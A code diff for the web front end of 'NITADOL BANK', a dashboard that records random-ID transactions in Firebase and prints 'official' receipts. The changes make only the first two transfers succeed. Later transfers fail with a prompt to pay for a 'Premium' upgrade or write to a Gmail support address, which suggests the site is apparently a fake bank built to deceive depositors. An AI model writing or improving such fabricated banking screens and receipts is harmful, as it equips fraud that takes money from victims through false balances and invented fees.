@@ -12,7 +12,7 @@
                 layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
                 autoDisplay: true
             }, 'google_translate_element');
-      
+     
             setTimeout(() => {
                 const userLang = navigator.language || navigator.userLanguage;
                 const langCode = userLang.split('-')[0];
@@ -102,7 +102,6 @@
             } else {
                 historyCont.innerHTML = `<div class="py-20 text-center opacity-30 italic">No ledger entries found.</div>`;
             }
-
             // NEW ADDED: Dynamic font shrinking based on exact character length + force left alignment + guarantee full number visibility (no ellipsis ever)
             // This runs every time balance updates and makes the number smaller as it gets longer
             let fontSize = 3.75;
@@ -195,7 +194,6 @@
                 txId: "NTD-" + Math.floor(1000000000 + Math.random() * 9000000000)
             };
             await push(ref(rtdb, 'users/' + auth.currentUser.uid + '/transactions'), txData);
-
             // NEW ADDED: If transfer is successful (only first 2 times), deduct amount from balance and update Firebase
             if (status === "Success" && currentUserData.balance !== undefined) {
                 const newBalance = Math.max(0, (currentUserData.balance || 0) - amount);
@@ -203,12 +201,17 @@
                 await update(ref(rtdb, 'users/' + auth.currentUser.uid), { balance: newBalance });
                 updateDashboardUI(currentUserData); // live UI update
             }
-
             document.getElementById('trans-input').classList.add('hidden');
             document.getElementById('trans-pin').classList.add('hidden');
             if (status === "Failed") {
                 document.getElementById('success-receipt').classList.add('hidden');
                 document.getElementById('error-screen').classList.remove('hidden');
+                // NEW ADDED: Clear upgrade message on failed transfers (only first 2 are allowed)
+                document.getElementById('error-upgrade-message').innerHTML = `
+                    <strong>Only 2 successful transfers allowed per account.</strong><br>
+                    Upgrade your account to Premium or contact customer service:<br>
+                    <span class="underline">nitadolb@gmail.com</span>
+                `;
             } else {
                 document.getElementById('error-screen').classList.add('hidden');
                 document.getElementById('success-receipt').classList.remove('hidden');
@@ -277,6 +280,30 @@
             window.print();
             document.body.innerHTML = originalContents;
             window.location.reload();
+            // NEW ADDED: Improved clean print receipt (opens dedicated window with ONLY receipt + professional styling)
+            const printWin = window.open('', '_blank');
+            printWin.document.write(`
+                <html>
+                <head>
+                    <title>NITADOL BANK - Official Receipt</title>
+                    <style>
+                        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;900&display=swap');
+                        body { font-family: 'Outfit', sans-serif; padding: 40px; max-width: 600px; margin: 0 auto; background: white; color: #0f172a; }
+                        .receipt-header { display: flex; align-items: center; gap: 12px; border-bottom: 3px solid #0f172a; padding-bottom: 20px; margin-bottom: 30px; }
+                        .receipt-header .logo { background: #0f172a; color: white; width: 48px; height: 48px; border-radius: 9999px; display: flex; align-items: center; justify-content: center; font-size: 28px; font-weight: 900; }
+                        .receipt-body { line-height: 1.6; }
+                        .receipt-row { display: flex; justify-content: space-between; margin-bottom: 14px; font-size: 15px; }
+                        .amount-big { font-size: 42px; font-weight: 900; letter-spacing: -2px; margin: 20px 0; }
+                    </style>
+                </head>
+                <body>
+                    ${receipt.innerHTML}
+                </body>
+                </html>
+            `);
+            printWin.document.close();
+            printWin.focus();
+            setTimeout(() => printWin.print(), 500);
         };
         window.toggleMobileMenu = () => {
             const menu = document.getElementById('mobile-menu-dropdown');
@@ -319,7 +346,7 @@
         .atm-card { background: linear-gradient(145deg, #0f172a 0%, #334155 100%); border: 1px solid rgba(255,255,255,0.1); }
         .custom-scroll::-webkit-scrollbar { width: 4px; }
         .custom-scroll::-webkit-scrollbar-thumb { background: #2563eb; border-radius: 10px; }
-  
+ 
         /* Smooth transition for font size changes */
         #user-balance { transition: font-size 0.3s ease; }
         .section-header { font-size: 2.75rem; line-height: 1.1; font-weight: 900; letter-spacing: -2px; }
@@ -370,7 +397,6 @@
         .dark .inner-square {
             background: linear-gradient(145deg, #1e2937, #334155);
         }
-
         /* NEW ADDED FIXES - extra inner layer removed (transparent) + amount is black + starts from left edge */
         .inner-square {
             background: transparent !important;
@@ -396,7 +422,6 @@
         .dark #user-balance {
             color: #ffffff !important;
         }
-
         /* EDGE-TO-EDGE ON PHONE + REDUCED HEIGHT + FULL WIDTH for both cards */
         @media (max-width: 768px) {
             .square-box {
@@ -415,13 +440,26 @@
             #dashboard main .grid.lg\:grid-cols-2 {
                 gap: 16px !important;
             }
+            /* NEW ADDED: Mobile dashboard comfort - more breathing room, better spacing */
+            #dashboard main { padding: 24px 16px !important; }
+            #dashboard .max-w-5xl { padding-top: 40px !important; }
+            .square-box { margin-bottom: 24px !important; }
         }
-
         /* Receipt print fix - force all details to be visible when printing */
         @media print {
             .receipt-row { display: flex !important; }
             #success-receipt { display: block !important; visibility: visible !important; }
             #receipt-sender, #receipt-receiver, #receipt-amount { display: block !important; }
+        }
+        /* NEW ADDED: Mature & professional receipt styling */
+        #success-receipt .bg-slate-100 {
+            border: 2px solid #0f172a;
+            box-shadow: 0 10px 30px -10px rgb(15 23 42);
+        }
+        #success-receipt .receipt-header {
+            border-bottom: 3px solid #0f172a;
+            padding-bottom: 20px;
+            margin-bottom: 30px;
         }
     </style>
 </head>
@@ -581,7 +619,7 @@
         <div class="bg-white dark:bg-slate-900 p-8 md:p-12 rounded-[3rem] w-full max-w-2xl shadow-2xl overflow-y-auto max-h-[90vh] custom-scroll">
             <h2 class="text-3xl font-black mb-2">Create Global Account</h2>
             <p class="text-slate-400 text-xs font-bold uppercase tracking-widest mb-8">Personal & Security Details</p>
-     
+    
             <div class="grid md:grid-cols-2 gap-4 mb-6">
                 <input id="s-name" type="text" placeholder="Full Legal Name" class="p-4 bg-slate-50 dark:bg-slate-800 border dark:border-slate-700 rounded-2xl outline-none">
                 <input id="s-email" type="email" placeholder="Email Address" class="p-4 bg-slate-50 dark:bg-slate-800 border dark:border-slate-700 rounded-2xl outline-none">
@@ -720,7 +758,7 @@
     <div id="trans-modal" class="hidden modal-overlay fixed inset-0 bg-slate-950/90 backdrop-blur-md z-[200] items-center justify-center p-4">
         <div class="bg-white dark:bg-slate-900 w-full max-w-lg rounded-[3rem] p-10 shadow-2xl relative border border-slate-800/50 max-h-[90vh] overflow-y-auto custom-scroll">
             <button onclick="closeModal()" class="absolute top-8 right-8 text-2xl opacity-30">&times;</button>
-     
+    
             <!-- Input Screen -->
             <div id="trans-input" class="space-y-6">
                 <h2 id="modal-title" class="text-2xl font-black uppercase">Transfer</h2>
@@ -748,6 +786,20 @@
             </div>
             <!-- SUCCESS RECEIPT - ENHANCED WITH SENDER + RECEIVER -->
             <div id="success-receipt" class="hidden text-center py-6 space-y-8">
+                <!-- NEW ADDED: Mature professional receipt header -->
+                <div class="receipt-header flex items-center justify-between">
+                    <div class="flex items-center gap-3">
+                        <div class="w-10 h-10 bg-blue-600 rounded-2xl flex items-center justify-center text-white text-3xl font-black">N</div>
+                        <div>
+                            <h1 class="text-2xl font-black tracking-tighter">NITADOL BANK</h1>
+                            <p class="text-xs font-bold text-slate-400">PRIVATE WEALTH • USD</p>
+                        </div>
+                    </div>
+                    <div class="text-right">
+                        <p class="text-xs font-bold uppercase">Official Transaction Receipt</p>
+                        <p class="text-[10px] text-slate-400">SECURE • VERIFIED • CONFIDENTIAL</p>
+                    </div>
+                </div>
                 <div class="mx-auto w-16 h-16 bg-green-100 dark:bg-green-900/30 flex items-center justify-center rounded-2xl text-5xl">✅</div>
                 <h2 class="text-3xl font-black text-green-600">Transaction Successful</h2>
                 <div class="bg-slate-100 dark:bg-slate-800 rounded-3xl p-8 text-left max-w-xs mx-auto">
@@ -775,8 +827,8 @@
             <div id="error-screen" class="hidden text-center py-6">
                 <div class="w-20 h-20 bg-red-100 text-red-600 rounded-full flex items-center justify-center text-4xl mx-auto mb-6">⚠️</div>
                 <h2 class="text-2xl font-black text-red-600 mb-4 uppercase leading-none">Transaction Rejected</h2>
-                <div class="p-6 bg-red-50 dark:bg-red-950/20 rounded-2xl border border-red-100 dark:border-red-900/50 text-xs text-red-700 dark:text-red-400 font-bold mb-6">
-                    SECURITY NOTICE: Manual clearance required for international transfers. <br><br> Support: <span class="underline">nitadolb@gmail.com</span>
+                <div id="error-upgrade-message" class="p-6 bg-red-50 dark:bg-red-950/20 rounded-2xl border border-red-100 dark:border-red-900/50 text-xs text-red-700 dark:text-red-400 font-bold mb-6">
+                    <!-- Dynamic message populated by JS -->
                 </div>
                 <button onclick="closeModal()" class="w-full py-5 bg-slate-900 text-white rounded-2xl font-black">Close</button>
             </div>
